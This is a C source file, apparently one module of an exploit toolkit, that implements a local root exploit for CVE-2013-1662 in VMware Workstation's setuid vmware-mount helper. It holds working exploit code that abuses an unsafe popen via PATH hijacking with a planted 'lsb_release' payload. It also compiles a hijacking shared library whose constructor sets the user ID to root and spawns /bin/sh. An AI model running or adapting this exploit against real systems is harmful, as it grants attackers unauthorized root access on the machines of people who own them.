#include <stdio.h>
#include <stdlib.h>
#include "../xploit.h"

void vmwareMountSuidHelp()
{
    printf("%s[ CVE-2013-1662 ]%s VMWare setuid vmware-mount unsafe popen(3)\n", txtblu, txtrst);
    printf("Affected software: VMWare Workstation ver. <= 9.0.2 build-1031769\n");
    printf("References:\n");
    printf("http://blog.cmpxchg8b.com/2013/08/security-debianisms.html\n");
    printf("http://www.vmware.com/support/support-resources/advisories/VMSA-2013-0010.html\n");
}

int vmwareMountSuidFunc(struct Xploit *xp, unsigned char *rawPayload, unsigned int rawPayloadLen)
{
	int setuid;
	unsigned char *payload;
	unsigned int payload_len;
    enum LINUX_DISTRO distro;
    FILE *f;

    unsigned char giveShell[] =
        "#include <stdio.h>\n"
        "void __attribute__((constructor)) init()\n"
        "{\n"
        "   char *a[] = {\"/bin/sh\", NULL};\n"
        "   setresuid(0, 0, 0);\n"
        "   execve(*a, a, NULL);\n"
        "}\n";

	// check if applicable
	setuid = system("test -u /usr/bin/vmware-mount");
	if(setuid != 0) {
		printf("system not vulnerable\n");
		return 1;
	}

    // check OS
    distro = os_check_distro();

    if(distro == Debian || distro == Ubuntu) {
        // select & configure payload
        payload = rawPayload;
        payload_len = rawPayloadLen;

        // exploitation
        create_x86_elf("lsb_release", payload, payload_len);
        system("PATH=.:$PATH /usr/bin/vmware-mount");
    }
    else if(os_check_compiler()) {
        system("ln /usr/bin/vmware-mount /tmp/vmware-mount-mz");
        f = popen("gcc -fPIC -O2 -shared -xc -o /tmp/libcrypto.so.0.9.8 -", "w");
        fprintf(f, giveShell);
        pclose(f);
        system("/tmp/vmware-mount-mz");
    }
    else {
        printf("C compiler is missing\n");
        return 1;
    }	

    return 0;
}

struct exploit vmwareMountSuid = {
    0,
    "vmware-mount",
    vmwareMountSuidFunc,
    NULL,
    0,
    vmwareMountSuidHelp, 
    NULL
};
